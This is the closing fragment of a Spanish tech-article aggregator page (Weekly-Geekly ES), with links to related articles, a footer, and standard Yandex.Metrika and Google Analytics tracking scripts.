<li><a href="../466287/index.html">Informe e investigaciÃ³n de confiabilidad de los segmentos nacionales de Internet de 2019</a></li>
<li><a href="../466289/index.html">Iniciativas legislativas. ExtraÃ±o, pero presentado a la Duma del Estado</a></li>
<li><a href="../466291/index.html">Encuesta de sostenibilidad de segmentos nacionales de Internet para 2019</a></li>
<li><a href="../466295/index.html">CachÃ© de reserva sin dolor en Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>